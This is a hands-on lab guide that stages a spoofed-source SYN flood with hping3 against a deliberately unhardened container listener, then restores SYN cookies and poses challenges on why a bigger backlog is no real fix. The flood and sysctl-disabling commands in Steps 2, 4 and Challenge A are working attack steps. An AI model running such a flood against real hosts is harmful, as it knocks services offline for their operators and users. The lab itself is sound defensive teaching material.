# Lab 15 — SYN Flood

## Objective
Flood a small, deliberately unhardened listener with spoofed-source SYNs
until its half-open connection queue is full and real clients get shut
out, then fix it the way production actually fixes it — not by making the
queue bigger, but by turning on SYN cookies.

## Why this matters
A SYN flood is the original, still-common denial-of-service primitive: it
costs the attacker almost nothing (one packet, no reply needed) and, on an
unhardened host, it costs the victim one scarce kernel resource — the SYN
backlog — per spoofed packet. Every modern Linux box ships a kernel-level
fix for this that's been on by default for over two decades (SYN cookies),
and this lab exists to show you exactly what it does and why simply
"making the queue bigger" is not the same fix.

> This lab's traffic stays entirely inside its own two-node topology —
> `attacker` only ever floods `victim`'s address on this private link.
> Never point these techniques at anything outside a lab you own.

## Prerequisites
- Docker + [containerlab](https://containerlab.dev) installed
- `debian:bookworm-slim` image pulled

Check first:
```bash
docker version
containerlab version
docker pull debian:bookworm-slim
```

## Topology
```
attacker (10.0.0.10/24) -- victim (10.0.0.20/24)
```

## Step 1 — Deploy, install tools, address
```bash
sudo containerlab deploy -t topology.clab.yml

docker exec clab-syn-flood-attacker bash -c \
  "apt-get update -qq && apt-get install -y -qq iproute2 iputils-ping hping3 netcat-openbsd >/dev/null"
docker exec clab-syn-flood-victim bash -c \
  "apt-get update -qq && apt-get install -y -qq iproute2 iputils-ping python3 net-tools iproute2 procps >/dev/null"

docker exec clab-syn-flood-attacker ip addr add 10.0.0.10/24 dev eth1
docker exec clab-syn-flood-attacker ip link set eth1 up

docker exec clab-syn-flood-victim ip addr add 10.0.0.20/24 dev eth1
docker exec clab-syn-flood-victim ip link set eth1 up

docker exec clab-syn-flood-attacker ping -c 3 10.0.0.20
```

## Step 2 — Build the unhardened "before" state on the victim
```bash
docker exec clab-syn-flood-victim sysctl -w net.ipv4.tcp_syncookies=0
docker exec clab-syn-flood-victim sysctl -w net.ipv4.tcp_max_syn_backlog=128
```
`tcp_syncookies=0` disables the kernel's real mitigation, and a backlog of
128 makes exhaustion fast enough to watch happen in seconds instead of
minutes — standing in for a host nobody has hardened.

## Step 3 — Start a real listener
```bash
docker exec -d clab-syn-flood-victim python3 - <<'EOF'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 8080))
s.listen(128)
while True:
    conn, addr = s.accept()
    conn.close()
EOF
```
Confirm a normal connection works before flooding anything:
```bash
docker exec clab-syn-flood-attacker nc -zv -w 3 10.0.0.20 8080
```

## Step 4 — Flood it
```bash
docker exec -d clab-syn-flood-attacker hping3 -S -p 8080 --flood --rand-source 10.0.0.20
```
> Gotcha: `--rand-source` isn't just for hiding the attacker — it's load-
> bearing for the attack itself. `hping3` crafts raw SYN packets outside
> the kernel's own TCP connection state, so if you used the attacker's
> *real* source IP instead, its own kernel would receive `victim`'s
> SYN-ACK replies for connections it has no record of ever opening, and
> respond with an immediate RST — quietly cleaning up the very half-open
> state you're trying to create. Spoofing the source is what stops that.

## Step 5 — Watch a legitimate connection get shut out
While the flood above keeps running in the background:
```bash
docker exec clab-syn-flood-attacker bash -c "time nc -zv -w 3 10.0.0.20 8080"
```
This should time out or hang for the full 3 seconds — a completely normal
three-way handshake attempt, dropped along with everyone else's.
```bash
docker exec clab-syn-flood-victim netstat -s | grep -i -E "SYN|listen|overflow"
docker exec clab-syn-flood-victim ss -s
```
Look for a SYN-related drop counter climbing — the exact wording varies by
kernel version, but something like "SYNs to LISTEN sockets dropped" or a
listen-overflow counter is the tell.

## Step 6 — Stop the flood and harden the victim
```bash
docker exec clab-syn-flood-attacker pkill hping3
docker exec clab-syn-flood-victim sysctl -w net.ipv4.tcp_syncookies=1
```
This is the healthy end state the rest of this lab starts back from —
`tcp_syncookies` on, no flood running. The two challenges below each
re-disable it deliberately to set up a specific scenario.

## Challenges

**Challenge A:**
```bash
docker exec clab-syn-flood-victim sysctl -w net.ipv4.tcp_syncookies=0
docker exec -d clab-syn-flood-attacker hping3 -S -p 8080 --flood --rand-source 10.0.0.20
```
Give it a couple of seconds, then confirm the current state and the drop
counters:
```bash
docker exec clab-syn-flood-victim sysctl net.ipv4.tcp_syncookies net.ipv4.tcp_max_syn_backlog
docker exec clab-syn-flood-victim netstat -s | grep -i -E "SYN|listen|overflow"
```
Work out what's actually being exhausted here before deciding on a fix.

**Challenge B:**
The flood from Challenge A is still running and `tcp_syncookies` is still
`0`. Someone "fixes" it by just making the queue bigger, without touching
SYN cookies:
```bash
docker exec clab-syn-flood-victim sysctl -w net.ipv4.tcp_max_syn_backlog=4096
docker exec clab-syn-flood-attacker bash -c "time nc -zv -w 3 10.0.0.20 8080"
```
This looks like it should buy a lot more headroom — 32x the queue size.
Give the flood a few seconds against the bigger backlog, then retest the
legitimate connection. Decide whether a bigger number actually solved
anything, or just moved the deadline.

(Stop the flood before moving on: `docker exec clab-syn-flood-attacker
pkill hping3`.)

See `solution.md` only after you've formed your own diagnosis.
